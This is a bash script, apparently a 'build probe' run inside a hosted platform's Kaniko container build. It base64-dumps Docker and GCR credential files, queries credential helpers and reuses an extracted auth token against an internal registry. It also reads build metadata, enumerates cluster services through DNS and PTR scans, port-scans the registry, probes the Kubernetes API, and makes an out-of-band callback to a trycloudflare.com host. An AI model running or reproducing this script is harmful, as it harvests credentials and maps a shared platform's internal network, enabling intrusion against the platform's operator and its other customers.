#!/bin/bash
echo "=== BUILD PROBE V4 START $(date -u) ==="

echo "=== DOCKER CONFIG BASE64 ==="
cat /kaniko/.docker/config.json 2>/dev/null | base64 || echo "NO_CONFIG"

echo "=== GCR CRED CONFIG ==="
cat /kaniko/.config/gcloud/docker_credential_gcr_config.json 2>/dev/null | base64 || echo "NO_GCR_CONFIG"
ls -la /kaniko/.config/ 2>/dev/null || echo "NO_CONFIG_DIR"
ls -laR /kaniko/.docker/ 2>/dev/null || echo "NO_DOCKER_DIR"

echo "=== CREDENTIAL HELPERS ==="
echo '10.245.151.100:5000' | /kaniko/docker-credential-gcr get 2>&1 | base64 || echo "NO_GCR_CRED"
echo '10.245.151.100:5000' | /kaniko/docker-credential-ecr-login get 2>&1 | base64 || echo "NO_ECR_CRED"

echo "=== DOCKER REGISTRY V2 API ==="
curl -sv --connect-timeout 5 --max-time 8 http://10.245.151.100:5000/v2/ 2>&1
echo "---"
curl -sv --connect-timeout 5 --max-time 8 https://10.245.151.100:5000/v2/ 2>&1
echo "---"

echo "=== REGISTRY CATALOG ==="
curl -s --connect-timeout 5 --max-time 8 http://10.245.151.100:5000/v2/_catalog 2>&1
echo ""

echo "=== REGISTRY WITH AUTH ==="
DOCKER_CREDS=$(cat /kaniko/.docker/config.json 2>/dev/null)
AUTH_TOKEN=$(echo "$DOCKER_CREDS" | grep -o '"auth":"[^"]*"' | head -1 | cut -d'"' -f4)
if [ -n "$AUTH_TOKEN" ]; then
  echo "AUTH_FOUND"
  curl -sv --connect-timeout 5 --max-time 8 -H "Authorization: Basic $AUTH_TOKEN" http://10.245.151.100:5000/v2/_catalog 2>&1
else
  echo "NO_AUTH_IN_CONFIG"
fi

echo "=== BUILD METADATA ==="
ls -la /.app_platform/.build_metadata/ 2>/dev/null || echo "NO_BUILD_META_DIR"
find /.app_platform/ -type f 2>/dev/null | head -20
cat /.app_platform/.build_metadata/* 2>/dev/null | head -40 || echo "NO_BUILD_META_FILES"

echo "=== APP PLATFORM BUILD SCRIPT ==="
cat /.app_platform/build.sh 2>/dev/null | base64 || echo "NO_BUILD_SCRIPT"

echo "=== APPS-COREDNS PROBE ==="
curl -s --connect-timeout 3 --max-time 5 http://10.245.0.11:9153/metrics 2>&1 | head -40 || echo "COREDNS_METRICS_FAILED"
curl -s --connect-timeout 3 --max-time 5 http://10.245.0.11:8080/health 2>&1 || echo "COREDNS_HEALTH_FAILED"
curl -s --connect-timeout 3 --max-time 5 http://10.245.0.11:8181/ready 2>&1 || echo "COREDNS_READY_FAILED"

echo "=== CERT-MANAGER PROBE ==="
curl -s --connect-timeout 3 --max-time 5 http://10.245.13.202:9402/metrics 2>&1 | head -40 || echo "CM_METRICS_FAILED"
curl -sk --connect-timeout 3 --max-time 5 https://10.245.63.7:443/ 2>&1 | head -20 || echo "CM_WEBHOOK_FAILED"

echo "=== DNS VIA APPS-COREDNS ==="
for svc in apps-coredns registry docker-registry docr harbor kaniko buildkit buildkitd image-builder do-registry container-registry; do
  for ns in coredns default kube-system registry docr build-system; do
    result=$(dig +short ${svc}.${ns}.svc.cluster.local @10.245.0.11 2>/dev/null)
    if [ -n "$result" ]; then
      echo "${svc}.${ns}: $result"
    fi
  done
done

echo "=== WIDER PTR SCAN ==="
for i in $(seq 1 30); do
  result=$(dig -x 10.245.0.${i} @10.245.0.11 +short 2>/dev/null)
  if [ -n "$result" ]; then
    echo "10.245.0.${i}: $result"
  fi
done
for octet in 13 63 126 151 162 189 210; do
  for i in $(seq 1 10); do
    result=$(dig -x 10.245.${octet}.${i} @10.245.0.10 +short 2>/dev/null)
    if [ -n "$result" ]; then
      echo "10.245.${octet}.${i}: $result"
    fi
  done
done

echo "=== REGISTRY IP PORT SCAN ==="
for port in 443 5000 8080 8443 9090 80; do
  timeout 3 bash -c "echo >/dev/tcp/10.245.151.100/$port" 2>/dev/null && echo "REG_OPEN:$port" || true
done

echo "=== K8S API PROBE ==="
curl -sk --connect-timeout 3 --max-time 5 https://10.245.0.1:443/version 2>&1 || echo "K8S_API_FAILED"
curl -sk --connect-timeout 3 --max-time 5 https://10.245.0.1:443/api 2>&1 | head -20 || echo "K8S_API2_FAILED"

echo "=== OOB BUILD V4 ==="
curl -s --connect-timeout 5 --max-time 8 "https://cheapest-vessel-hometown-equipped.trycloudflare.com/docker-build-v4-probe" 2>&1 || echo "OOB_FAILED"

echo "=== BUILD PROBE V4 END $(date -u) ==="
